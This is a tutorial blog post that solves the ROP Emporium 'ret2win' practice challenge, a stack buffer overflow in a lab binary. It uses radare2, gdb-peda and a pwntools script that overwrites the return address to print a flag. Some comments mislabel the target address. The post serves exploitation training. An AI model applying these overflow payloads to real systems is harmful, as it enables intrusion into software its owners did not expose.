---
layout:   post
title:      "ROP- Basic Exploit Creation"
date:       2019-07-26
author:     "D4mianwayne"
tag:      rop, pwn, radare2, pwntools
category: Return Oriented Programming
---


This blog post will teach you basics of ROP i.e. how to use tools efficilently.

# Overview

This post is more practical, so tag along with radare2, pwntools, gdb and ropper ready. I'm using [this](https://ropemporium.com/binary/ret2win.zip) binary from ROP-Emporium and it's a basic one to start with. Grab it and read further.

# The EIP and RIP Register

I'm starting off with IP register i.e. Instruction Pointer in 16-bit mode, Extended Instruction Pointer in 32-bit architecture and RIP in 64-bit. It contains the address of next instruction that will be executed hence, controlling the flow of command. Consider this register as something that will have the control of program flow since it has the next instruction which has to be executed.
# Analysis of 
Let's run the binary and see what it says. 

```bash
robin@oracle:~/ROP-Emporium$ ./ret2win
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)

```
Using bunch of "**A**s" we can see we got a segmentation fault that means we got a buffer overflow that means there is no bound checking. Let's analyze the binary and see where is the input is overflowed.

As the first post contained radare2 as a resource for analysis of binary. Starting off with that, type `rabin2 -I ret2win` to get the information about the binary.

```bash
robin@oracle:~/ROP-Emporium$ rabin2 -I ret2win
arch     x86
binsz    7071
bintype  elf
bits     64
canary   false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true

```

From above we now know that it's x86 arcitercture and a 64-bit ELF and endianess is set to little. Now, let's run `r2 ret2win` and see what functions it has.

```bash
robin@oracle:~/ROP-Emporium$ r2 ret2win
[0x00400650]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[0x00400650]> afl
0x00400000    2 64           loc.imp.__gmon_start
0x00400041    1 171          fcn.00400041
0x004005a0    3 26           sym._init
0x004005d0    1 6            sym.imp.puts
0x004005e0    1 6            sym.imp.system
0x004005f0    1 6            sym.imp.printf
0x00400600    1 6            sym.imp.memset
0x00400610    1 6            sym.imp.__libc_start_main
0x00400620    1 6            sym.imp.fgets
0x00400630    1 6            sym.imp.setvbuf
0x00400640    1 6            sub.__gmon_start___248_640
0x00400650    1 41           entry0
0x00400680    4 50   -> 41   sym.deregister_tm_clones
0x004006c0    3 53           sym.register_tm_clones
0x00400700    3 28           sym.__do_global_dtors_aux
0x00400720    4 38   -> 35   entry1.init
0x00400746    1 111          sym.main
0x004007b5    1 92           sym.pwnme
0x00400811    1 32           sym.ret2win
0x00400840    4 101          sym.__libc_csu_init
0x004008b0    1 2            sym.__libc_csu_fini
0x004008b4    1 9            sym._fini
[0x00400650]> 

```
So, we have a `sym.ret2win`, `sym.pwnme` and a `sym.main` which will be our focus for the rest. Since it's a ROP challenge and checking the functions one by one with `pdf @sym.ret2win` in radare2 shell. 

```bash
[0x00400650]> pdf @sym.ret2win
/ (fcn) sym.ret2win 32
|   sym.ret2win ();
|           0x00400811      55             push rbp
|           0x00400812      4889e5         mov rbp, rsp
|           0x00400815      bfe0094000     mov edi, str.Thank_you__Here_s_your_flag: ; 0x4009e0 ; "Thank you! Here's your flag:" ; const char * format
|           0x0040081a      b800000000     mov eax, 0
|           0x0040081f      e8ccfdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400824      bffd094000     mov edi, str.bin_cat_flag.txt ; 0x4009fd ; "/bin/cat flag.txt" ; const char * string
|           0x00400829      e8b2fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0040082e      90             nop
|           0x0040082f      5d             pop rbp
\           0x00400830      c3             ret

```

We see that there is a string with **/bin/cat flag.txt** and a system function call of C, in case you don't know what `system` does, it executes the arguments as bash command. 

Since we want to jump to address `0x00400811` in order to execute above function which will print our flag. In order to execute this we need to find the offset that we need to overwrite the instruction pointer. In this case, it is a 64-bit ELF we have to find **RIP** if it was 32-bit ELF we had to find **EIP**. Let's try to create a pattern offset uding gdb.

```bash
robin@oracle:~/ROP-Emporium$ gdb ret2win
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ret2win...(no debugging symbols found)...done.
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ pattern_create 100 input
Writing pattern of 100 chars to filename "input"
gdb-peda$ r < input
Starting program: /home/robin/ROP-Emporium/ret2win < input
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> 
Program received signal SIGSEGV, Segmentation fault.

```

##### Command Explaination

* `gdb ret2win` : This will open the gdb with ret2win binary for the processing.
* `pattern_create 100 input` : This will create a offset pattern of the length provided, in our case it's 100. `input` is the file where the offset willbe written.
* `r < input` : This will run the binary ret2win and gives the `input` file as input.


# Analyzing the offsets

Let's see the peda's work and informatio it provided us:-

```bash
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffde10 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBX: 0x0 
RCX: 0x1f 
RDX: 0x7ffff7dd18d0 --> 0x0 
RSI: 0x7fffffffde10 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RDI: 0x7fffffffde11 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffde38 ("AA0AAFAAb")
RIP: 0x400810 (<pwnme+91>:	ret)
R8 : 0x0 
R9 : 0x0 
R10: 0x602010 --> 0x0 
R11: 0x246 
R12: 0x400650 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdf20 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400809 <pwnme+84>:	call   0x400620 <fgets@plt>
   0x40080e <pwnme+89>:	nop
   0x40080f <pwnme+90>:	leave  
=> 0x400810 <pwnme+91>:	ret    
   0x400811 <ret2win>:	push   rbp
   0x400812 <ret2win+1>:	mov    rbp,rsp
   0x400815 <ret2win+4>:	mov    edi,0x4009e0
   0x40081a <ret2win+9>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde38 ("AA0AAFAAb")
0008| 0x7fffffffde40 --> 0x400062 --> 0x1f8000000000000 
0016| 0x7fffffffde48 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0024| 0x7fffffffde50 --> 0x1 
0032| 0x7fffffffde58 --> 0x7fffffffdf28 --> 0x7fffffffe2b4 ("/home/robin/ROP-Emporium/ret2win")
0040| 0x7fffffffde60 --> 0x100008000 
0048| 0x7fffffffde68 --> 0x400746 (<main>:	push   rbp)
0056| 0x7fffffffde70 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400810 in pwnme ()

```

In 64-bit binaries we can see the RIP doesn't contain our sequence. In 64-bit, it will not pop a value into RIP if it cannot actually jump to the address and execute it. So the value is at top of the stack after popping to RIP failed. So from above we can see that RSP has the pattern, we can get value from it. As we can see it has a value of **"AA0AAFAAb"** at the time of segment fault.

Time to find the padding we need in order to execute the instruction properly. Using peda:-

```

gdb-peda$ pattern_offset AA0AAFAAb
AA0AAFAAb found at offset: 40

```

# Creating Exploit

Now, we have all we need to execute the exploit. Now let's craft the exploit.
We need the memory address of RIP and the padding length and python, of course.

Using pwntools to craft exploit:-

```python
from pwn import * # Importing all functions from pwntools

prog = process("./ret2win") # Opening ret2win library

payload = "A" * 40 # padding
payload += p64(0x00400824) # Address of "push rbp" from sym.pwnme

open('payload', 'w').write(payload) # Writing the payload to fie payload.

```

Now, run the exploit:-

```bash
robin@oracle:~/ROP-Emporium$ python ret2win.py
[+] Starting local process './ret2win': pid 9089
[*] Stopped process './ret2win' (pid 9089)
robin@oracle:~/ROP-Emporium$ ./ret2win < payload
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> ROPE{a_placeholder_32byte_flag!}

```

Bam, we read the flag by pushing the `pop rbp` address to RIP hence executing our payload.

Follow me on [twitter](https://twitter.com/d4mianwayne) for more ROP contents.
